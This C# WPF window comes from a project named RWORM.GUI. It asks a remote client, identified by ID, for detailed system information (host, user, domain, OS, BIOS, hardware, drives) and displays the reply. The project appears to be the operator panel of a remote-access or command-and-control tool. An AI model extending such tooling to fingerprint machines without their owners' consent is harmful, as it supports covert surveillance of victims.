using System;
using System.Collections.Generic;
using System.Text;
using System.Text.Json;
using System.Windows;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class SystemInfoWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _clientId;

        public class DriveItem
        {
            public string Name { get; set; } = "";
            public string Format { get; set; } = "";
            public string Total { get; set; } = "";
            public string Free { get; set; } = "";
        }

        public SystemInfoWindow(ServerConnection server, string clientId)
        {
            InitializeComponent();
            _server = server;
            _clientId = clientId;

            _server.RegisterSystemInfoHandler(_clientId, OnSystemInfoDetailedReceived);
            Closed += (s, e) => _server.UnregisterSystemInfoHandler(_clientId);

            LoadData();
        }

        private void LoadData()
        {
            StatusText.Text = "Querying system hardware and power status...";
            _server.RequestSystemInfoDetailed(_clientId);
        }

        private static string GetStringProp(JsonElement root, string prop1, string prop2 = "")
        {
            if (root.TryGetProperty(prop1, out var p1) && p1.ValueKind == JsonValueKind.String)
                return p1.GetString() ?? "";
            if (!string.IsNullOrEmpty(prop2) && root.TryGetProperty(prop2, out var p2) && p2.ValueKind == JsonValueKind.String)
                return p2.GetString() ?? "";
            return "";
        }

        private static int GetIntProp(JsonElement root, string prop1, string prop2 = "", int fallback = 0)
        {
            if (root.TryGetProperty(prop1, out var p1) && p1.ValueKind == JsonValueKind.Number && p1.TryGetInt32(out var v1))
                return v1;
            if (!string.IsNullOrEmpty(prop2) && root.TryGetProperty(prop2, out var p2) && p2.ValueKind == JsonValueKind.Number && p2.TryGetInt32(out var v2))
                return v2;
            return fallback;
        }

        private static long GetLongProp(JsonElement root, string prop1, string prop2 = "", long fallback = 0)
        {
            if (root.TryGetProperty(prop1, out var p1) && p1.ValueKind == JsonValueKind.Number && p1.TryGetInt64(out var v1))
                return v1;
            if (!string.IsNullOrEmpty(prop2) && root.TryGetProperty(prop2, out var p2) && p2.ValueKind == JsonValueKind.Number && p2.TryGetInt64(out var v2))
                return v2;
            return fallback;
        }

        private static bool GetBoolProp(JsonElement root, string prop1, string prop2 = "")
        {
            if (root.TryGetProperty(prop1, out var p1) && (p1.ValueKind == JsonValueKind.True || p1.ValueKind == JsonValueKind.False))
                return p1.GetBoolean();
            if (!string.IsNullOrEmpty(prop2) && root.TryGetProperty(prop2, out var p2) && (p2.ValueKind == JsonValueKind.True || p2.ValueKind == JsonValueKind.False))
                return p2.GetBoolean();
            return false;
        }

        private void OnSystemInfoDetailedReceived(byte[] data)
        {
            var json = Encoding.UTF8.GetString(data);
            Dispatcher.Invoke(() =>
            {
                try
                {
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;

                    // Device type
                    var devType = GetStringProp(root, "device_type", "deviceType");
                    TxtDeviceType.Text = string.IsNullOrEmpty(devType) ? "Desktop PC" : devType;

                    // Battery & Power
                    var battPct = GetIntProp(root, "battery_percent", "batteryPercent", -1);
                    var battStatus = GetStringProp(root, "battery_status", "chargingStatus");
                    var powerLine = GetStringProp(root, "power_line", "chargingStatus");

                    if (battPct >= 0)
                    {
                        TxtBatteryLevel.Text = $"{battPct}%" + (!string.IsNullOrEmpty(battStatus) ? $" ({battStatus})" : "");
                    }
                    else
                    {
                        TxtBatteryLevel.Text = "No Battery (AC Powered / Desktop)";
                    }
                    TxtPowerStatus.Text = !string.IsNullOrEmpty(powerLine) ? powerLine : (!string.IsNullOrEmpty(battStatus) ? battStatus : "AC Power");

                    // Machine & User
                    var host = GetStringProp(root, "machine_name", "hostname");
                    TxtHost.Text = host;

                    var user = GetStringProp(root, "user_name", "username");
                    var domain = GetStringProp(root, "domain_name", "domain");
                    TxtUser.Text = !string.IsNullOrEmpty(domain) && !domain.Equals(host, StringComparison.OrdinalIgnoreCase)
                        ? $"{domain}\\{user}"
                        : user;

                    // OS
                    var os = GetStringProp(root, "os_version", "osVersion");
                    var is64 = GetBoolProp(root, "is_64bit", "is64BitOS");
                    TxtOS.Text = $"{os} ({(is64 ? "64-bit" : "32-bit")})";

                    // Uptime
                    var uptimeSec = GetLongProp(root, "uptime_seconds");
                    if (uptimeSec > 0)
                    {
                        var ts = TimeSpan.FromSeconds(uptimeSec);
                        TxtUptime.Text = $"{ts.Days}d {ts.Hours}h {ts.Minutes}m {ts.Seconds}s";
                    }
                    else
                    {
                        var upStr = GetStringProp(root, "uptime");
                        TxtUptime.Text = !string.IsNullOrEmpty(upStr) ? upStr : "N/A";
                    }

                    // CPU
                    var cpu = GetStringProp(root, "cpu_name", "cpuName");
                    var cores = GetIntProp(root, "processor_count", "processorCount", Environment.ProcessorCount);
                    TxtCPU.Text = !string.IsNullOrEmpty(cpu) ? $"{cpu} ({cores} logical cores)" : $"{cores} logical cores";

                    // BIOS
                    var biosVendor = GetStringProp(root, "bios_vendor", "biosVendor");
                    var biosVer = GetStringProp(root, "bios_version", "biosVersion");
                    var biosDate = GetStringProp(root, "bios_date", "biosDate");
                    var biosFull = $"{biosVendor} {biosVer}".Trim();
                    if (!string.IsNullOrEmpty(biosDate)) biosFull += $" ({biosDate})";
                    TxtBIOS.Text = !string.IsNullOrEmpty(biosFull) ? biosFull : "Standard BIOS / UEFI";

                    // RAM
                    var ramMb = GetLongProp(root, "total_ram_mb", "totalRamMb");
                    TxtRAM.Text = ramMb > 0 ? $"{ramMb:N0} MB (~{(ramMb / 1024.0):F1} GB)" : "N/A";

                    // Screen
                    var sw = GetIntProp(root, "screen_width");
                    var sh = GetIntProp(root, "screen_height");
                    if (sw > 0 && sh > 0)
                    {
                        TxtScreen.Text = $"{sw} x {sh}";
                    }
                    else
                    {
                        var resStr = GetStringProp(root, "resolution");
                        TxtScreen.Text = !string.IsNullOrEmpty(resStr) ? resStr : "N/A";
                    }

                    // Drives
                    var drives = new List<DriveItem>();
                    if (root.TryGetProperty("drives", out var drivesEl) && drivesEl.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var d in drivesEl.EnumerateArray())
                        {
                            var dName = GetStringProp(d, "name");
                            var dFmt = GetStringProp(d, "format");
                            var dTot = d.TryGetProperty("total_gb", out var dt1) ? dt1.GetDouble() : (d.TryGetProperty("totalGb", out var dt2) ? dt2.GetDouble() : 0.0);
                            var dFree = d.TryGetProperty("free_gb", out var df1) ? df1.GetDouble() : (d.TryGetProperty("freeGb", out var df2) ? df2.GetDouble() : 0.0);

                            drives.Add(new DriveItem
                            {
                                Name = dName,
                                Format = dFmt,
                                Total = $"{dTot:F1} GB",
                                Free = $"{dFree:F1} GB"
                            });
                        }
                    }
                    DrivesGrid.ItemsSource = drives;

                    StatusText.Text = "System details up to date.";
                }
                catch (Exception ex)
                {
                    StatusText.Text = $"Error parsing system details: {ex.Message}";
                }
            });
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e)
        {
            LoadData();
        }
    }
}
